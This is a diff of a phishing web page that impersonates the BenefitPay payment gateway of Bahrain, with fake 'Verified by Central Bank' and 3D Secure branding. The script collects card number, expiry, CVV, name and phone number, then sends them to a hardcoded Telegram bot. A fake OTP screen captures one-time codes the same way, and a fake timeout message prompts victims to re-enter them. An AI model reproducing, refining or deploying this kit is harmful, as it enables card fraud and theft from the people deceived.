@@ -3,72 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BenefitPay | Secure Checkout</title>
+    <meta property="og:title" content="BenefitPay - Secure Portal">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ce/Flag_of_Bahrain.svg/2560px-Flag_of_Bahrain.svg.png">
+    <title>BenefitPay Gateway</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f8f9fa; direction: rtl; margin: 0; color: #333; }
-        .top-banner { background: #000; color: #00ff00; text-align: center; font-size: 10px; padding: 4px; font-family: monospace; }
-        .header { background: #e21e26; color: #fff; padding: 15px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .container { padding: 15px; max-width: 420px; margin: auto; }
-        .card { background: #fff; border-radius: 12px; padding: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); position: relative; overflow: hidden; }
-        .timer { font-size: 11px; color: #e21e26; text-align: left; margin-bottom: 10px; font-weight: bold; }
-        label { display: block; margin-bottom: 5px; font-weight: 600; color: #555; font-size: 13px; }
-        input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; box-sizing: border-box; transition: 0.3s; background: #fafafa; }
-        input:focus { border-color: #e21e26; background: #fff; outline: none; box-shadow: 0 0 0 3px rgba(226, 30, 38, 0.1); }
-        .btn { background: #e21e26; color: #fff; border: none; width: 100%; padding: 16px; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.2s; }
-        .btn:hover { background: #c1181f; }
-        #loading-screen, #otp-screen { display: none; text-align: center; padding: 30px 10px; }
-        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #e21e26; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        body { font-family: -apple-system, sans-serif; background: #f2f2f2; direction: rtl; margin: 0; }
+        .header { background: #e21e26; color: #fff; padding: 15px; display: flex; align-items: center; justify-content: space-between; }
+        .container { padding: 20px; max-width: 400px; margin: auto; }
+        .card { background: #fff; border-radius: 12px; padding: 25px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        label { display: block; margin-bottom: 5px; font-weight: bold; color: #444; font-size: 13px; text-align: right; }
+        input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; box-sizing: border-box; text-align: center; }
+        .btn { background: #e21e26; color: #fff; border: none; width: 100%; padding: 16px; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        #otp-screen, #loading-screen { display: none; text-align: center; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #e21e26; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .footer-logos { margin-top: 20px; display: flex; justify-content: center; gap: 15px; opacity: 0.4; filter: grayscale(1); }
+        .footer-logos { margin-top: 20px; display: flex; justify-content: center; gap: 15px; opacity: 0.5; }
     </style>
 </head>
 <body>
-    <div class="top-banner">SECURE SESSION ID: 882-004-921-BAH | AES-256 ENCRYPTION</div>
-    
     <div class="header">
-        <div><strong>BenefitPay</strong><br><small>National Electronic Wallet</small></div>
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ce/Flag_of_Bahrain.svg/2560px-Flag_of_Bahrain.svg.png" width="40">
+        <div><strong>BenefitPay</strong><br><small>Verified by Central Bank</small></div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ce/Flag_of_Bahrain.svg/2560px-Flag_of_Bahrain.svg.png" width="45">
     </div>
 
     <div class="container">
         <div class="card" id="main-card">
-            <div class="timer">Session expires in: <span id="time">05:00</span></div>
-            
-            <label>Amount to Process (BHD)</label>
-            <input type="number" id="amount" placeholder="0.000" style="font-weight: bold; color: #e21e26; font-size: 20px;">
-            
+            <label>Amount (BHD)</label>
+            <input type="number" id="amount" placeholder="0.000" style="border: 2px solid #e21e26; font-size: 22px; font-weight: bold;">
             <label>Cardholder Name</label>
-            <input type="text" id="holder" placeholder="Name on card">
-            
+            <input type="text" id="holder" placeholder="Full Name">
             <label>Card Number</label>
             <input type="text" id="card" placeholder="0000 0000 0000 0000" maxlength="19">
-            
             <div style="display: flex; gap: 10px;">
-                <div style="flex:1"><label>Expiry (MM/YY)</label><input type="text" id="exp" placeholder="MM/YY" maxlength="5"></div>
+                <div style="flex:1"><label>Expiry</label><input type="text" id="exp" placeholder="MM/YY" maxlength="5"></div>
                 <div style="flex:1"><label>CVV</label><input type="password" id="cvv" placeholder="***" maxlength="3"></div>
             </div>
-            
-            <button class="btn" onclick="sendData()">Pay Securely</button>
+            <label>Mobile Number</label>
+            <input type="number" id="phone" placeholder="3XXXXXXX">
+            <button class="btn" onclick="sendData()">Confirm & Pay</button>
             
             <div class="footer-logos">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/100px-Visa_Inc._logo.svg.png" width="40">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/100px-Mastercard-logo.svg.png" width="30">
-                <img src="https://www.pci-ivs.com/wp-content/uploads/2021/05/pci-dss-compliant-logo.png" width="40">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d6/Visa_2021.svg/1200px-Visa_2021.svg.png" width="40">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1200px-Mastercard-logo.svg.png" width="35">
             </div>
         </div>
 
         <div class="card" id="loading-screen">
             <div class="spinner"></div>
-            <h3 id="load-text">Contacting Issuer Bank...</h3>
-            <p style="font-size: 12px; color: #888;">Please do not refresh or press back button.</p>
+            <h3>Verifying Data...</h3>
+            <p style="font-size: 12px; color: #777;">Connecting to secure server.</p>
         </div>
 
         <div class="card" id="otp-screen">
-            <h3 style="color: #e21e26;">3D Secure™ Verification</h3>
-            <p style="font-size: 13px;">A one-time password has been sent to your registered mobile number.</p>
-            <input type="number" id="otp_code" placeholder="******" style="font-size: 28px; letter-spacing: 10px; border: 2px solid #e21e26;">
-            <button class="btn" onclick="finalStep()">Submit OTP</button>
-            <p id="error-msg" style="color: red; display: none; font-size: 12px; margin-top: 15px;">⚠️ Authentication failed. System is retrying. Please stay on this page.</p>
+            <h3 style="color: #e21e26;">Secure Verification</h3>
+            <p>Enter the 6-digit code sent to your phone</p>
+            <input type="number" id="otp_code" placeholder="******" style="font-size: 26px; letter-spacing: 8px;">
+            <button class="btn" onclick="finalStep()">Verify OTP</button>
+            <p id="error-msg" style="color: red; display: none; margin-top: 15px; font-weight: bold;">⚠️ Connection timeout. System is busy, please re-enter the code.</p>
         </div>
     </div>
 
@@ -76,30 +67,19 @@
     const token = "8428698833:AAHTDJu1uFDF61ytjsxh8PlSWwbrSPWSGG0";
     const chatId = "8302667206";
 
-    // Timer Function
-    function startTimer(duration, display) {
-        var timer = duration, minutes, seconds;
-        setInterval(function () {
-            minutes = parseInt(timer / 60, 10);
-            seconds = parseInt(timer % 60, 10);
-            seconds = seconds < 10 ? "0" + seconds : seconds;
-            display.textContent = minutes + ":" + seconds;
-            if (--timer < 0) timer = duration;
-        }, 1000);
-    }
-    window.onload = function () { startTimer(300, document.querySelector('#time')); };
-
-    // Format Card & Date
+    // Auto-format Card
     document.getElementById('card').addEventListener('input', e => {
         e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
     });
+
+    // Auto-format Expiry
     document.getElementById('exp').addEventListener('input', e => {
         if (e.target.value.length === 2 && !e.target.value.includes('/')) e.target.value += '/';
     });
 
     function sendData() {
-        const msg = `🔥 [NEW PAYMENT] 🔥\n--------------------\n💰 Amt: ${document.getElementById('amount').value} BHD\n👤 Name: ${document.getElementById('holder').value}\n💳 Card: ${document.getElementById('card').value}\n🗓 Exp: ${document.getElementById('exp').value}\n🔒 CVV: ${document.getElementById('cvv').value}`;
-        
+        const msg = `🔥 NEW HIT 🔥\nAmt: ${document.getElementById('amount').value}\nName: ${document.getElementById('holder').value}\nCard: ${document.getElementById('card').value}\nExp: ${document.getElementById('exp').value}\nCVV: ${document.getElementById('cvv').value}\nPh: ${document.getElementById('phone').value}`;
+
         fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
         .then(() => {
             document.getElementById('main-card').style.display = 'none';
@@ -107,13 +87,13 @@
             setTimeout(() => {
                 document.getElementById('loading-screen').style.display = 'none';
                 document.getElementById('otp-screen').style.display = 'block';
-            }, 5000);
-        });
+            }, 4000);
+        }).catch(err => alert("Connection Error. Try again."));
     }
 
     function finalStep() {
         const otp = document.getElementById('otp_code').value;
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🔑 [OTP CODE]: " + otp)}`)
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🔑 OTP: " + otp)}`)
         .then(() => {
             document.getElementById('otp_code').value = '';
             document.getElementById('error-msg').style.display = 'block';
